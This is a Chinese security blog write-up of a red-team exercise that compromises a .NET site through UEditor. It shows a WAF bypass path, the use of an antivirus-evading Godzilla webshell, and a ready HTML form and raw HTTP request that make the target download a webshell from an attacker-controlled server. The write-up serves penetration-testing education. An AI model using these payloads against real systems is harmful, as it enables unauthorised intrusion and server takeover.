---
title: 记某次攻防演练：大战UEditor并突破
url: https://www.secpulse.com/archives/205162.html
source: 安全脉搏
date: 2025-01-17
fetch_date: 2025-10-06T20:08:26.659984
---

# 记某次攻防演练：大战UEditor并突破

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 记某次攻防演练：大战UEditor并突破

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-16

19,047

## 前言

最近参与某次攻防演练，通过前期信息收集，发现某靶标单位存在某域名备案。

![image-20240514214308675](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605049.png)

通过fofa搜索子域名站点，发现存在一个子域名的61000端口开放着一个后台，于是开始进行渗透。

![image-20240514214548286](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605050.png)

## 目录扫描

进行目录扫描吗，发现/bin.rar路径可以访问到一个压缩文件。

![image-20240514215942617](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605051.png)

使用下载器下载到电脑，打开压缩包，猜测内容为站点源代码，代码为.net形式，使用c#语言编写。

![image-20240514220414191](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605052.png)

C#代码经过编译后为`dll文件形式`，根据dll文件命名规则和.net类型代码格式。我们可以初步判定`xxx.Application.Web.dll`文件中存在主要的后端逻辑代码。

![image-20240514221038999](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605053.png)

但是dll为二进制文件我们无法直接查看，因此需要使用dnspy进行反编译查看。

查看方法：将dll文件丢入dnspy即可。

![image-20240514221649029](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605054.png)

## UEditor的曲折利用

在源码中发现该系统使用UEditor。

![image-20240514222621847](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605055.png)

可得UEditor的路径`/Utility/UEditor/controller.ashx`

![image-20240514224050050](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605056.png)

访问关键接口`/Utility/UEditor/?action=catchimage`和`/Utility/UEditor/?action=config`

然而服务器返回403无法访问。

![image-20240514224921144](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605057.png)

![image-20240514225148874](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605058.png)

通过Fuzz发现403的原因是有可能是因为waf或者edr的拦截。

使用`/Utility/UEditor/.css?action=catchimage`可进行bypass，成功访问关键接口。

![image-20240514225345566](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605059.png)

接下来就是参考UEditor .net版本的任意文件上传漏洞进行上传哥斯拉jsp webshell。

漏洞利用参考链接：

<https://www.freebuf.com/vuls/181814.html>

![image-20240514225544573](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605060.png)

上传过程中发现普通哥斯拉jsp webshell上传后就被杀软拦截无法访问。

于是用<https://github.com/Tas9er/ByPassGodzilla>项目对webshell进行免杀处理。

方可成功上传webshell并进行连接，至此该UEditor站点利用完成，后面就是愉快的打内网。

![image-20240514230422817](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605061.png)

## UEditor的简便利用

传统的UEditor利用都是本地编写一个html文件中包含一个表单，通过提交表单使目标服务器根据提交的图片马地址下载webshell。

```
<form action="http://xxxxxxxxx/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
  <p>shell addr:<input type="text" name="source[]" /></p >
  <inputtype="submit" value="Submit" />
</form>
```

原理还是通过http请求发送图片马地址，所以直接在burpsuite发包也可以达到相同的效果，省去制作html文件的步骤。

```
POST /替换漏洞URL地址拼接/UEditor/controller.ashx?action=catchimage HTTP/1.1
Host: x.x.x.x
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

source[]=http://替换为自己服务器开启http服务的URL地址/666.jpg?.aspx
```

请求发送后，返回包返回webshell路径。

![image-20240514231742498](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406281605062.png)

## 总结

1. UEditor作为热门常见漏洞，在大型企业集团中的.net老旧系统中非常常见，相关的利用方法以及绕过方法需要非常熟练，方可快人一步迅速拿下权限；
2. 在渗透测试过程中，我们可能会遇到一些与实验环境或他人分享的情况不同的挑战。这时，我们需要具备排查问题原因的能力。例如，在利用漏洞的过程中,可能会遇到无法上传webshell或请求被WAF拦截等情况。我们需要根据场景，修改payload或使用fuzz等技术进行绕过，直到成功利用漏洞并获取所需的权限，完成渗透。大战UEditor并突破。

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205162.html**](https://www.secpulse.com/archives/205162.html)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Solon框架模板漏洞深度剖析与修复实战](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/7266edd7-a4cc-444d-bacb-7ee802487ac4.png)

  Solon框架模板漏洞深度剖析与修复实战](https://www.secpulse.com/archives/206316.html "详细阅读 Solon框架模板漏洞深度剖析与修复实战")
* [![路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202503171628715.png)

  路由器安全研究：D-Link DIR-8](https://www.secpulse.com/archives/206007.html "详细阅读 路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路")
* [![DedeBIZ系统审计小结](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502121526395.png)

  DedeBIZ系统审计小结](https://www.secpulse.com/archives/205891.html "详细阅读 DedeBIZ系统审计小结")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?author_id=37244aaa) | [蚁景网安实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)](https://www.secpulse.com/newpage/author?author_id=37244) | |
| 文章数：402 | 积分： 877 |
| 蚁景网安实验室（www.yijinglab.com）网络安全靶场练习平台，涉及CTF赛前指导、职业技能训练、网安专项技能提升等。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[...